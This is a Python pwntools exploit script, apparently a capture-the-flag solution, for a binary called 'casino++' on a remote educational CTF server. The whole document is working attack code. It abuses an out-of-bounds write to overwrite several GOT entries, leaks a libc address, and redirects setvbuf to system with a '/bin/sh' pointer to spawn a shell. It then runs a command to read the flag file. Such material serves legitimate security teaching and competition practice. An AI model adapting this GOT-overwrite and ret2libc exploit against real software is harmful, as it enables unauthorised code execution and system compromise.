'/ NX enabled ! /'
from pwn import *
context(arch = 'amd64', os = 'linux')
_loc = False
r = process('./casino++') if _loc else remote('edu-ctf.csie.org', 10176)

def hijack( got_addr, jmp_addr ):
	offset1 = (got_addr - 0x6020d0)//4 + 1
	val1 = str( jmp_addr & ((1<<32)-1) )
	val2 = str( (jmp_addr >> 32) & ((1<<32)-1) )
	outcome = ['60','42','15','0','68','54']
	for i in range(6):
		r.sendlineafter(':', '1')
	r.sendlineafter(']:', '1')
	r.sendlineafter(']:', str(offset1))
	r.sendlineafter(':', val1)
	for i in range(6):
		r.sendlineafter(':', outcome[i])
	r.sendlineafter(']:', '1')
	r.sendlineafter(']:', str(offset1 +1))
	r.sendlineafter(':', val2)

r.sendlineafter( "name: ", 'A'*0x20 )
r.sendlineafter( "age: ", '20' )

hijack( 0x602020, 0x40095d ) # got[puts()] = & casino() 
hijack( 0x6020a0, 0x601ff0 ) # got[stderr()] = & got[start_main()]
hijack( 0x602050, 0x400706 ) # got[setvbuf()] = resolve printf@plt
hijack( 0x602048, 0x40095d ) # got[time()] = & casino()
hijack( 0x602020, 0x400857 ) # got[puts()] = & init()
start_main = u64( r.recvline()[9:15] + b'\0\0' )
libc_base = start_main - (0x20740 if _loc else 0x21ab0)
bin_sh_ptr = libc_base + (0x18cd57 if _loc else 0x1b3e9a)
system_func = libc_base + (0x45390 if _loc else 0x4f440)
success( "libc_base = " + hex(libc_base) )

hijack( 0x602020, 0x40095d ) # got[puts()] = & casino()
hijack( 0x6020a0, bin_sh_ptr ) # got[stderr()] = bin_sh_ptr
hijack( 0x602050, system_func ) # got[setvbuf()] = system_func
hijack( 0x602020, 0x400857 ) # got[puts()] = & init()

r.sendline('cat /home/`whoami`/flag')
r.interactive()
